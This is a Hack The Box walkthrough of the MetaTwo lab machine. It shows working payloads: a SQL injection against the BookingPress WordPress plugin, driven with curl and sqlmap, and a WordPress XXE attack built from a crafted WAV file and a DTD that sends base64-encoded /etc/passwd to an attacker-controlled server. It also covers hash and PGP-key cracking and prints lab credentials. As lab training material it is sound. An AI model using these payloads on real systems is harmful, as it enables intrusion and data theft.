 ---
title: "HTB MetaTwo: CVE-2022-0739"
date: 2022-12-06T11:30:03+00:00
weight: 1
# aliases: ["/first"]
tags: ["hackthebox"]
categories: ["hackthebox","easy","linux", "git-hooks-privesc"]
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "HTB MetaTwo walkthrough"
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: false
UseHugoToc: true
cover:
    image: "metatwo/MetaTwo.png" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: false # only hide on current single page
---

## Overview
On this machine, we have a wordpress server, one of whose plugins is vulnerable to unauthenticated SQL injection, which can be used to get the password for the admin panel. After that, we will get access to the internal files through XXE vulnerability, as well as access to the ftp-server, and for privileges escalation we will crack the private PGP key block of the passpie password manager.

## Recon

```
$ nmap -T5 -sC -sV -oA nmap_result 10.10.11.186
Nmap scan report for smtp.metapress.htb (10.10.11.186)
Host is up (0.14s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT   STATE  SERVICE  VERSION
21/tcp  open   ftp?
22/tcp  open   tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
43/tcp  filtered whois
80/tcp  open   http    nginx 1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
```

 ```nmap```: port 80 - HTTP with a redirect to http://metapress.htb/, resolve it in /etc/hosts.

```
10.10.11.186  metapress.htb
```

## HTTP
The web server is a Wordpress server with version 5.6.2, which is vulnerable to CVE-2021-29447, so we need to have access* to an account with permissions to upload files.

> CVE-2021-29447: a user with the ability to upload files (such as an author) can take advantage of the XML parsing problem in the multimedia library, leading to XXE attacks. This requires installation of WordPress using PHP 8. Access to internal files is possible if an XXE attack succeeds.*

![Desktop View](/metatwo/static_1.avif)

Also, in the source code of the Events page we can find that it uses bookingpress plugin version 1.0.10, which is vulnerable to CVE-2022-0739. Let's figure out how it works.

![Desktop View](/metatwo/static_2.avif)

## CVE-2022-0739

https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357

To exploit the vulnerability we don't need to have any user's rights and we only need to have data about the _wpnonce variable, which can be found in the sources of the page after triggering event via BookingPress module:


> ### PoC
> - Create a new "category" and associate it with a new "service" via the BookingPress admin menu (/wp-admin/admin.php?page=bookingpress_services)
> - Create a new page with the "[bookingpress_form]" shortcode embedded (the "BookingPress Step-by-step Wizard Form")
> - Visit the just created page as an unauthenticated user and extract the "nonce" (view source -> search for ."action:'bookingpress_front_get_category_services'")
> - Invoke the following curl command: ```curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' ```
>  
> - Time based payload: 
>  ```curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&>    category_id=1&total_service=1) AND (SELECT 9578 FROM (SELECT(SLEEP(5)))iyUp)-- ZmjH' ```


```bash
curl -i 'https://example.com/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=8cc8b79544&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

Once we get _wpnonce, we execute the command and intercept the request with a burp to feed it all into sqlmap:

```bash
$ сurl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=f600af85bb&category_id=33&total_service=2' -x http://127.0.0.1:8080
```

After catching the request and saving it to a file, let's try slqmap:

```bash
$ sqlmap -r post.txt -p total_service -D blog -T wp_users --dump
 

[*] starting @ 22:44:24 /2022-12-06/

[22:44:24] [INFO] parsing HTTP request from 'post.txt'
[22:44:24] [INFO] resuming back-end DBMS 'mysql' 
[22:44:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: total_service (POST)
  Type: time-based blind
  Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  Payload: action=bookingpress_front_get_category_services&_wpnonce=be77c6197f&category_id=33&total_service=1) AND (SELECT 5232 FROM (SELECT(SLEEP(5)))hLrl) AND (2634=2634

  Type: UNION query
  Title: Generic UNION query (NULL) - 9 columns
  Payload: action=bookingpress_front_get_category_services&_wpnonce=be77c6197f&category_id=33&total_service=1) UNION ALL SELECT NULL,NULL,CONCAT(0x71716b7871,0x5061684c6658754c64624e62786e504a7049646552447a744e6e71517255776177426b4244736476,0x71766a6a71),NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[22:44:24] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.0.24, Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:44:24] [INFO] fetching columns for table 'wp_users' in database 'blog'
[22:44:24] [INFO] fetching entries for table 'wp_users' in database 'blog'
[22:44:24] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] N
Database: blog
Table: wp_users
[2 entries]
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+------------------------+
| ID | user_url            | user_pass                          | user_email             | user_login | user_status | display_name  | user_nicename | user_registered       | user_activation_key |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+------------------------+
| 1 | http://metapress.htb | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb    | admin      | 0           | admin         | admin         | 2022-06-23 17:58:28   | <blank>             |
| 2 | <blank>              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb  | manager    | 0           | manager       | manager       |  2022-06-23 18:07:55  | <blank>             |
+----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+------------------------+
[*] ending @ 22:44:28 /2022-12-06/
```


We get hashes, one of which we can break with a hashcat using the rockyou dictionary:

```bash
❯ hashcat -m 400 -a 0 manager_pass.hash /usr/share/wordlists/rockyou.txt

$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar   
                              
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 400 (phpass)
Hash.Target......: $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
Time.Started.....: Tue Dec 6 23:08:23 2022 (17 secs)
Time.Estimated...: Tue Dec 6 23:08:40 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   6857 H/s (9.25ms) @ Accel:512 Loops:128 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 110592/14344385 (0.77%)
Rejected.........: 0/110592 (0.00%)
Restore.Point....: 106496/14344385 (0.74%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:8064-8192
Candidate.Engine.: Device Generator
Candidates.#1....: harmless -> music69
Hardware.Mon.#1..: Temp: 84c Util: 98%
```


We got the credentials for the admin-panel, from where we can exploit the XXE vulnerability CVE-2021-29447, mentioned at the beginning.

![Desktop View](/metatwo/static_3.avif)
## CVE-2021-29447
To exploit this vulnerability we need a CMS below 5.7.1, PHP 8 and a user account with file upload privileges, which is appropriate in our case.

> https://tryhackme.com/room/wordpresscve202129447
> https://www.acunetix.com/vulnerabilities/web/wordpress-5-6-x-multiple-vulnerabilities-5-6-5-6-2/
> https://github.com/AssassinUKG/CVE-2021-29447

### PoC
First of all, create a .wav file with the payload:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURIP:PORT/DTDFILE.dtd'"'"'>%remote;%init;%trick;]>\x00' > malicious.wav
```

As well as a .dtd file with the following code, this will allow us to execute the code after the web server receives the .dtd file:

```bash
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```

Then start the web server on the specified port and download the malicious .wav file and get the encrypted /etc/passwd:

![Desktop View](/metatwo/static_4.avif)

Decode it:

![Desktop View](/metatwo/static_5.avif)

Got `/etc/nginx/sites-enabled/default` by the same way and find out root dir for web-application:

![Desktop View](/metatwo/static_6.avif)

From `/var/www/metapress.htb/blog/wp-config.php` got the credentials for ftp:

![Desktop View](/metatwo/static_7.avif)

Connect vie ftp and in file `mailer/send_mail.php` got SSH credentials and user flag:

```bash
# Check the content of send_email.php
$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;
```
![Desktop View](/metatwo/static_10.avif)

## Privelege Escalation
On the server, the console password manager passpie is set up, which has a key for root, encrypted with a PGP key, which is located in the directory .passpie/:

> https://github.com/marcwebbie/passpie

![Desktop View](/metatwo/static_11.avif)

![Desktop View](/metatwo/static_12.avif)

We take the private key on our machine and convert it to a convenient format by the command:

```bash
$ gpg2john passpie.key > key.john

Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::PASSPIE_PGP_KEY
```

And crack it down using john and rockyou:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt key.john
```

![Desktop View](/metatwo/static_13.avif)

Knowing the passphrase, save the passwords with by command:

```bash
$ passpie copy ssh
```
And finally get the root.

![Desktop View](/metatwo/static_14.avif)

### Rooted.